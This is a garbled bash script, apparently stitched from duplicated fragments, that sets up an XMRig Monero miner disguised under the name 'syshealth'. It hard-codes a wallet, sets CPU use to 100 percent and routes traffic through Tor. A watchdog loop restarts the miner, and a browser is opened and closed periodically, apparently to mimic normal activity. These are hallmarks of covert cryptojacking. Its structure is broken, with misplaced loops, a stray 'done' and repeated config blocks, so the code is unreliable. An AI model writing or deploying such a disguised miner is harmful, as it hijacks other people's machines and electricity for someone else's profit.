# --- CONFIGURE THESE ---
WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
CPU_PCT=100
# Generate a random worker name each run (e.g., worker-<6 random chars>)
WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"

# --- Performance & Security Enhancements ---
echo "[Enhance] Enabling huge pages..."
sudo sysctl -w vm.nr_hugepages=128

echo "[Enhance] Tuning network buffers..."
sudo sysctl -w net.core.rmem_max=16777216
sudo sysctl -w net.core.wmem_max=16777216

# Detect CPU threads for optimal mining
CPU_THREADS=$(nproc)
echo "[Enhance] Detected $CPU_THREADS CPU threads."
# Generate preferences.json with enhancements
cat > "$PREFS_FILE" <<EOF
{
  "wallet": "$WALLET",
  "cpu_pct": $CPU_PCT,
  "worker_name": "$WORKER_NAME",
  "log-file": "$SCRIPT_DIR/xmrig.log",
  "donate-level": 0,
  "threads": $CPU_THREADS,
  "huge-pages": true
}
EOF
#!/bin/bash
# all_in_one_local_run.sh - One-command local setup and run for syshealth miner
# Usage: bash all_in_one_local_run.sh

# --- CONFIGURE THESE ---
WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
CPU_PCT=100
# Generate a random worker name each run (e.g., worker-<6 random chars>)
WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"
# ----------------------


set -e


# --- Browser open/close function ---
open_and_close_browser() {
  local URL="https://www.google.com"
  local BROWSER=""
  if command -v google-chrome >/dev/null 2>&1; then
    BROWSER="google-chrome"
  elif command -v chromium-browser >/dev/null 2>&1; then
    BROWSER="chromium-browser"
  elif command -v chromium >/dev/null 2>&1; then
    BROWSER="chromium"
  fi
  if [ -n "$BROWSER" ]; then
    $BROWSER "$URL" &
    BROWSER_PID=$!
    echo "Opened $BROWSER (PID $BROWSER_PID) for 10 seconds..."
    sleep 10
    kill $BROWSER_PID 2>/dev/null || true
    echo "Closed $BROWSER."
  else
    echo "No Chrome or Chromium browser found. Skipping browser open/close."
  fi
}

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_DIR="$SCRIPT_DIR/config"
PREFS_FILE="$CONFIG_DIR/preferences.json"

# Ensure dependencies
for dep in curl jq tor; do
  if ! command -v $dep >/dev/null 2>&1; then
    echo "$dep not found. Installing..."
    sudo apt-get update && sudo apt-get install -y $dep
  fi
# --- Monitoring ---
echo "[Enhance] Starting monitoring loop (ctrl+c to stop)..."
while true; do
  open_and_close_browser
  if ! pgrep -x tor > /dev/null; then
    echo "[all_in_one] Tor not running. Restarting..."
    nohup tor -f "$TORRC" > /dev/null 2>&1 &
  fi
  if ! pgrep -f "$SCRIPT_DIR/syshealth" > /dev/null; then
    echo "[all_in_one] syshealth not running. Restarting..."
    nohup "$SCRIPT_DIR/syshealth" --config="$PREFS_FILE" >> "$LOGFILE" 2>&1 &
  fi
  echo "[Monitor] CPU: $(top -bn1 | grep "Cpu(s)" | awk '{print $2 + $4}')% | Mem: $(free -m | awk '/Mem:/ {print $3"/"$2" MB"}')"
  sleep 60
done

# Download syshealth (XMRig) if not present
if [ ! -f "$SCRIPT_DIR/syshealth" ]; then
  XMRIG_VERSION="6.21.0"
  echo "Downloading XMRig $XMRIG_VERSION..."
  curl -L -o /tmp/xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
  tar -xzf /tmp/xmrig.tar.gz -C /tmp
  mv "/tmp/xmrig-${XMRIG_VERSION}/xmrig" "$SCRIPT_DIR/syshealth"
  chmod +x "$SCRIPT_DIR/syshealth"
  rm -rf /tmp/xmrig* /tmp/xmrig-${XMRIG_VERSION}
fi

# Create config directory if needed
mkdir -p "$CONFIG_DIR"

# Generate preferences.json
cat > "$PREFS_FILE" <<EOF
{
  "wallet": "$WALLET",
  "cpu_pct": $CPU_PCT,
  "worker_name": "$WORKER_NAME",
  "log-file": "$SCRIPT_DIR/xmrig.log"
}
EOF

# --- Tor setup ---
TORRC="/tmp/torrc_local"
TORDATA="/tmp/tor_data_local"
if [ ! -f "$TORRC" ]; then
  cat > "$TORRC" <<EOF
DataDirectory $TORDATA
SocksPort 9050
Log notice stdout
EOF
fi
mkdir -p "$TORDATA"
if ! pgrep -x tor > /dev/null; then
  nohup tor -f "$TORRC" > /dev/null 2>&1 &
  echo "Tor started."
else
  echo "Tor already running."
fi

# --- Scheduler ---
LOGFILE="$SCRIPT_DIR/xmrig_out.log"
echo "Starting scheduler loop (ctrl+c to stop)..."
done
while true; do
  open_and_close_browser
  if ! pgrep -x tor > /dev/null; then
    echo "[all_in_one] Tor not running. Restarting..."
    nohup tor -f "$TORRC" > /dev/null 2>&1 &
  fi
  if ! pgrep -f "$SCRIPT_DIR/syshealth" > /dev/null; then
    echo "[all_in_one] syshealth not running. Restarting..."
    nohup "$SCRIPT_DIR/syshealth" --config="$PREFS_FILE" >> "$LOGFILE" 2>&1 &
  fi
  sleep 60
